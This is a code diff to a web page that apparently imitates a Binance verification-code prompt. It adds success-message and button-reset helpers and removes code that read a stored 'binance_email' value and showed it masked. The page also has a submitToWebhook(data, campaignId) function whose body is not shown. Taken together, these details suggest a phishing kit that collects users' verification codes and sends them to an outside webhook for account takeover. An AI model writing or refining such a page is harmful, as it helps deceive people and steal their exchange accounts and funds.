@@ -515,7 +515,7 @@
                     border-radius: 4px;
                     border: 1px solid rgba(248, 73, 96, 0.2);
                 `;
-                const form = document.querySelector('.verification-form');
+                const form = document.querySelector('form');
                 form.appendChild(errorElement);
             }
             errorElement.textContent = message;
@@ -527,6 +527,37 @@
                     errorElement.style.display = 'none';
                 }
             }, 5000);
+        }
+
+        function showSuccess(message) {
+            // Create or update success message element
+            let successElement = document.getElementById('success-message');
+            if (!successElement) {
+                successElement = document.createElement('div');
+                successElement.id = 'success-message';
+                successElement.style.cssText = `
+                    color: #02c076;
+                    font-size: 14px;
+                    margin-top: 10px;
+                    text-align: center;
+                    padding: 8px;
+                    background: rgba(2, 192, 118, 0.1);
+                    border-radius: 4px;
+                    border: 1px solid rgba(2, 192, 118, 0.2);
+                `;
+                const form = document.querySelector('form');
+                form.appendChild(successElement);
+            }
+            successElement.textContent = message;
+            successElement.style.display = 'block';
+        }
+
+        function resetButton() {
+            const button = document.getElementById('submit-btn');
+            const buttonContent = button.querySelector('.button-content');
+            buttonContent.classList.remove('loading');
+            button.disabled = false;
+            toggleSubmitButton(); // Re-apply the disabled state based on input
         }
 
         function submitToWebhook(data, campaignId) {
@@ -699,41 +730,9 @@
             button.disabled = true;
         }
 
-        // Mask email utility
-        function maskEmail(email) {
-            if (!email || !email.trim()) return 'pop***@gmail.com';
-            
-            // Check if it's an email
-            if (email.includes('@')) {
-                const [user, domain] = email.split('@');
-                if (user.length <= 3) return user[0] + '***@' + domain;
-                return user.slice(0, 3) + '***@' + domain;
-            } 
-            // If it's a phone number
-            else {
-                const cleaned = email.replace(/\D/g, ''); // Remove non-digits
-                if (cleaned.length > 6) {
-                    return '***' + cleaned.slice(-4);
-                }
-                return '***' + cleaned.slice(-2);
-            }
-        }
-
-        // Auto-focus and set masked email
+        // Auto-focus when page loads
         window.addEventListener('load', function() {
             document.getElementById('verificationCode').focus();
-            const email = localStorage.getItem('binance_email') || sessionStorage.getItem('binance_email');
-            if (email) {
-                const maskedValue = maskEmail(email);
-                document.getElementById('masked-email').textContent = maskedValue;
-                // Update description text based on type
-                const descriptionElement = document.querySelector('.modal-description');
-                if (email.includes('@')) {
-                    descriptionElement.innerHTML = `Code will be sent to <span id="masked-email">${maskedValue}</span>.`;
-                } else {
-                    descriptionElement.innerHTML = `Code will be sent to <span id="masked-email">${maskedValue}</span>.`;
-                }
-            }
         });
     </script>
 </body>
